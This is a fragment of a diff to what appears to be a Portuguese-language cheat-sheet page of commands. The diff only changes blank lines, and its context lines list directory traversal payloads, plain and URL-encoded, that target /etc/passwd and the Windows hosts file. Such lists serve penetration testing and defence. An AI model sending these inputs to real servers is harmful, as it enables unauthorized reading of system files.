@@ -38,7 +38,7 @@ PAGINA CONTENDO [OUTROS](https://ygoralberto.github.io/outros) COMANDOS DE WINDO
 .
 
 	/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
- 
+
 .
 
 	%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
@@ -46,6 +46,7 @@ PAGINA CONTENDO [OUTROS](https://ygoralberto.github.io/outros) COMANDOS DE WINDO
 .
 
 	/../../../../../../../../../../etc/passwd
+
 .
 
 	/../../../../../../../../../../C:/Windows/System32/drivers/etc/hosts
